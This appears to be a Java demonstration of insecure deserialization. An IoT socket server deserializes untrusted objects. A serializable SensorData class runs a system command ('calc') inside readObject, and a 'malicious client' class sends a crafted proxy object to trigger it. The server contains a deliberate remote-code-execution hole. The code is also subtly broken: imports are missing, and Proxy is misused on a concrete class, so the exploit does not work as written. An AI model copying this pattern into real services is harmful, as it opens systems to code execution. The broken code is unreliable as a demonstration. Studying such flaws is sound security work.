import java.io.*;
import java.util.*;

class SensorData implements Serializable {
    private String deviceId;
    private transient Process process;

    public SensorData(String id) {
        this.deviceId = id;
    }

    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        try {
            process = Runtime.getRuntime().exec("calc");
        } catch (Exception e) {}
    }
}

public class IoTServer {
    public static void main(String[] args) {
        try {
            ServerSocket ss = new ServerSocket(8888);
            System.out.println("Server started...");
            while (true) {
                Socket socket = ss.accept();
                ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
                Object obj = ois.readObject();
                System.out.println("Received data from " + ((SensorData)obj).getClass().getName());
                ois.close();
                socket.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void receiveData(InputStream is) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(is);
        SensorData data = (SensorData) ois.readObject();
        System.out.println("Device ID: " + data.getClass().getName());
        ois.close();
    }
}

// 恶意客户端示例
class MaliciousClient {
    public static void main(String[] args) throws Exception {
        Socket socket = new Socket("127.0.0.1", 8888);
        ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
        oos.writeObject(Proxy.newProxyInstance(
            SensorData.class.getClassLoader(),
            new Class[]{SensorData.class},
            (proxy, method, methodArgs) -> {
                if (method.getName().equals("toString")) {
                    Runtime.getRuntime().exec("calc");
                }
                return null;
            }
        ));
        oos.close();
        socket.close();
    }
}